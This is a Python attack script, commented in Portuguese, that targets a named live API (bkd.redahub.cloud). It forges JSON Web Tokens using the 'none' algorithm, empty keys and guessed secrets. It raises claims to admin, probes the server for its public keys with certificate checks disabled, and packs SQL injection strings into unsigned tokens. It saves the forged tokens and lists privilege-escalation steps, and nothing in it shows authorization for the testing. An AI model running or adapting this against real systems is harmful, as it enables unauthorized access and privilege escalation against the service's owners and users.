#!/usr/bin/env python3
"""
JWT Token Manipulation & Security Testing
Target: REDAHUB API (bkd.redahub.cloud)
Author: Neural-OffSec-Team
"""

import jwt
import json
import base64
import requests
from typing import Optional

TARGET_API = "https://bkd.redahub.cloud/api"
VERIFY_SSL = False


class JWTManipulator:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = VERIFY_SSL
        # JWT de teste (será obtido via login legítimo se tivermos creds)
        self.test_token = None

    def decode_jwt_unsafe(self, token: str) -> dict:
        """Decode JWT sem verificação de assinatura"""
        try:
            # Decode sem verificação
            decoded = jwt.decode(token, options={"verify_signature": False})
            print(f"[+] Token decodificado:")
            print(json.dumps(decoded, indent=2))
            return decoded
        except Exception as e:
            print(f"[-] Erro ao decodificar: {e}")
            return None

    def test_algorithm_confusion(self, token: str) -> list:
        """Testa algorithm confusion (RS256 -> HS256)"""
        print("\n[*] Testando Algorithm Confusion (RS256 -> HS256)")
        print("=" * 60)

        results = []

        try:
            # Decode token original
            header = jwt.get_unverified_header(token)
            payload = jwt.decode(token, options={"verify_signature": False})

            print(f"[+] Algoritmo original: {header.get('alg', 'N/A')}")

            # 1. Mudar para 'none'
            print("\n[1] Testando algoritmo 'none'...")
            token_none = jwt.encode(payload, key="", algorithm="none")
            # Remove assinatura (formato: header.payload.)
            token_none_unsigned = ".".join(token_none.split(".")[:-1]) + "."
            results.append(("none_unsigned", token_none_unsigned))
            print(f"    Token gerado: {token_none_unsigned[:50]}...")

            # 2. HS256 com chave vazia
            print("\n[2] Testando HS256 com chave vazia...")
            token_hs256_empty = jwt.encode(payload, key="", algorithm="HS256")
            results.append(("HS256_empty_key", token_hs256_empty))
            print(f"    Token gerado: {token_hs256_empty[:50]}...")

            # 3. HS256 com chaves comuns
            common_keys = ["secret", "SECRET", "jwt_secret", "django_secret", "redahub", "REDAHUB"]
            for key in common_keys:
                print(f"\n[3] Testando HS256 com chave: {key}...")
                token_hs256_key = jwt.encode(payload, key=key, algorithm="HS256")
                results.append((f"HS256_key_{key}", token_hs256_key))
                print(f"    Token gerado: {token_hs256_key[:50]}...")

            # 4. Manipulação de claims
            print("\n[4] Testando manipulação de claims (admin elevation)...")
            payload_admin = payload.copy()
            # Tentar elevar privilégios
            payload_admin["is_staff"] = True
            payload_admin["is_superuser"] = True
            payload_admin["is_admin"] = True
            payload_admin["admin"] = True
            payload_admin["role"] = "admin"
            payload_admin["user_type"] = "admin"

            token_admin = jwt.encode(payload_admin, key="", algorithm="none")
            token_admin_unsigned = ".".join(token_admin.split(".")[:-1]) + "."
            results.append(("admin_elevation_none", token_admin_unsigned))
            print(f"    Token admin gerado: {token_admin_unsigned[:50]}...")

        except Exception as e:
            print(f"[-] Erro durante testes: {e}")

        return results

    def test_token_expiration(self, token: str) -> None:
        """Testa se expiração é validada"""
        print("\n[*] Testando validação de expiração")
        print("=" * 60)

        try:
            payload = jwt.decode(token, options={"verify_signature": False})

            # Remover exp claim
            payload_no_exp = payload.copy()
            if "exp" in payload_no_exp:
                del payload_no_exp["exp"]
                print("[+] Token sem 'exp' claim criado")

            # Expiração no passado (1 ano atrás)
            import time
            payload_expired = payload.copy()
            payload_expired["exp"] = int(time.time()) - 31536000
            print("[+] Token expirado (1 ano atrás) criado")

            # Expiração no futuro (10 anos)
            payload_future = payload.copy()
            payload_future["exp"] = int(time.time()) + 315360000
            print("[+] Token com expiração em 10 anos criado")

        except Exception as e:
            print(f"[-] Erro: {e}")

    def test_key_confusion(self, token: str) -> None:
        """Testa key confusion (usar chave pública como chave simétrica)"""
        print("\n[*] Testando Key Confusion Attack")
        print("=" * 60)
        print("[i] Requer chave pública RSA do servidor (/.well-known/jwks.json)")
        print("[i] Tentando obter JWKS...")

        try:
            # Tentar obter JWKS
            jwks_urls = [
                f"{TARGET_API}/.well-known/jwks.json",
                f"{TARGET_API}/auth/.well-known/jwks.json",
                "https://bkd.redahub.cloud/.well-known/jwks.json",
            ]

            for url in jwks_urls:
                print(f"[*] Tentando: {url}")
                resp = self.session.get(url)
                if resp.status_code == 200:
                    print(f"[+] JWKS encontrado!")
                    print(resp.text[:200])
                    return
                else:
                    print(f"    Status: {resp.status_code}")

            print("[-] JWKS não encontrado publicamente")

        except Exception as e:
            print(f"[-] Erro: {e}")

    def test_sql_injection_in_jwt(self, token: str) -> None:
        """Testa SQL injection em claims do JWT"""
        print("\n[*] Testando SQL Injection em JWT claims")
        print("=" * 60)

        payloads = [
            "' OR '1'='1",
            "admin'--",
            "' UNION SELECT NULL--",
            "1' AND 1=1--",
        ]

        try:
            payload = jwt.decode(token, options={"verify_signature": False})

            for sql_payload in payloads:
                print(f"[*] Payload: {sql_payload}")
                payload_sqli = payload.copy()
                # Injetar em todos os campos string
                for key in payload_sqli:
                    if isinstance(payload_sqli[key], str):
                        payload_sqli[key] = sql_payload

                token_sqli = jwt.encode(payload_sqli, key="", algorithm="none")
                token_sqli_unsigned = ".".join(token_sqli.split(".")[:-1]) + "."
                print(f"    Token gerado: {token_sqli_unsigned[:50]}...")

        except Exception as e:
            print(f"[-] Erro: {e}")

    def run_comprehensive_tests(self, token: Optional[str] = None):
        """Executa bateria completa de testes JWT"""
        print("[*] JWT Manipulation & Security Testing")
        print("[*] Target: REDAHUB API")
        print("=" * 60)

        if not token:
            print("\n[!] Nenhum token fornecido. Tentando obter token de teste...")
            print("[i] Para testes completos, forneça um JWT válido como argumento")
            print("[i] Gerando token de exemplo para demonstração...")

            # Token de exemplo para demonstração
            example_payload = {
                "user_id": 1,
                "email": "test@redahub.cloud",
                "exp": 1699999999,
            }
            token = jwt.encode(example_payload, key="secret", algorithm="HS256")
            print(f"\n[+] Token de exemplo gerado: {token[:50]}...\n")

        # Executar todos os testes
        self.decode_jwt_unsafe(token)
        manipulated_tokens = self.test_algorithm_confusion(token)
        self.test_token_expiration(token)
        self.test_key_confusion(token)
        self.test_sql_injection_in_jwt(token)

        # Relatório final
        print("\n" + "=" * 60)
        print("[*] RESUMO DOS TESTES")
        print("=" * 60)
        print(f"Total de tokens manipulados gerados: {len(manipulated_tokens)}")
        print("\n[+] Próximos passos:")
        print("    1. Testar cada token manipulado em endpoints autenticados")
        print("    2. Verificar se servidor valida assinatura")
        print("    3. Verificar se servidor valida algoritmo")
        print("    4. Verificar se servidor valida expiração")
        print("    5. Testar privilege escalation via claims")

        # Salvar tokens gerados
        output_file = "/tmp/jwt-manipulated-tokens.txt"
        with open(output_file, "w") as f:
            for name, token in manipulated_tokens:
                f.write(f"{name}:\n{token}\n\n")
        print(f"\n[+] Tokens salvos em: {output_file}")


if __name__ == "__main__":
    import urllib3
    import sys

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    token = sys.argv[1] if len(sys.argv) > 1 else None
    manipulator = JWTManipulator()
    manipulator.run_comprehensive_tests(token)
